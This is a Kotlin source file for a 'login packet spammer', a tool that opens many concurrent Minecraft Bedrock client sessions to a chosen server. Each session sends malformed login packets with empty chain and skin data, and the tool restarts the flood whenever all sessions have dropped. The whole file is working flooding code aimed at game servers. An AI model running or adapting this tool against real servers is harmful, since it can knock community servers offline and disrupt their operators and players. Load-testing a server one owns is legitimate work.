package dev.minjae.loginpacketspammer

import com.nukkitx.protocol.bedrock.BedrockClient
import com.nukkitx.protocol.bedrock.handler.BedrockPacketHandler
import com.nukkitx.protocol.bedrock.packet.LoginPacket
import com.nukkitx.protocol.bedrock.packet.NetworkSettingsPacket
import com.nukkitx.protocol.bedrock.packet.RequestNetworkSettingsPacket
import com.nukkitx.protocol.bedrock.v560.Bedrock_v560
import io.netty.util.AsciiString
import java.lang.Runtime.Version
import java.net.InetSocketAddress
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

object Spammer {

    val executorService: ExecutorService = if (Version.parse(System.getProperty("java.version")).feature() < 19) {
        logger.info("Running on Java 18 or lower, using native threads")
        Executors.newFixedThreadPool(100)
    } else {
        logger.info("Running on Java 19 or higher, using virtual threads")
        Executors.newVirtualThreadPerTaskExecutor()
    }

    val activeClients: MutableMap<Int, BedrockClient> = mutableMapOf()

    fun startSpamming(serverAddress: String, serverPort: Int, threadCount: Int, spamInterval: Float) {
        for (i in 0 until threadCount) {
            executorService.execute {
                val client = BedrockClient(InetSocketAddress(0))
                client.bind().join()
                client.setRakNetVersion(Bedrock_v560.V560_CODEC.raknetProtocolVersion)
                val session = client.connect(InetSocketAddress(serverAddress, serverPort)).get()
                session.packetHandler = object : BedrockPacketHandler {
                    override fun handle(packet: NetworkSettingsPacket): Boolean {
                        logger.info("Received RequestNetworkSettingsPacket")
                        session.setCompression(packet.compressionAlgorithm)
                        session.sendPacketImmediately(
                            LoginPacket().apply {
                                protocolVersion = Bedrock_v560.V560_CODEC.protocolVersion
                                chainData = AsciiString.EMPTY_STRING
                                skinData = AsciiString.EMPTY_STRING
                            }
                        )
                        return true
                    }
                }

                session.addDisconnectHandler {
                    logger.info("Session #$i disconnected because of ${it.name}")
                    synchronized(activeClients) {
                        activeClients.remove(i)
                    }
                }

                session.sendPacketImmediately(
                    RequestNetworkSettingsPacket().apply {
                        protocolVersion = Bedrock_v560.V560_CODEC.protocolVersion
                    }
                )
                activeClients[i] = client
            }
            Thread.sleep((spamInterval * 1000).toLong())
        }
    }

    fun interruptAll() {
        val iter = activeClients.iterator()
        while (iter.hasNext()) {
            val (_, client) = iter.next()
            client.close()
        }
        executorService.shutdownNow()
    }

    fun checkThreads(serverAddress: String, serverPort: Int, threadCount: Int, spamInterval: Float) {
        if (activeClients.isEmpty()) {
            logger.info("No threads found, starting $threadCount threads again")
            startSpamming(serverAddress, serverPort, threadCount, spamInterval)
        }
    }
}
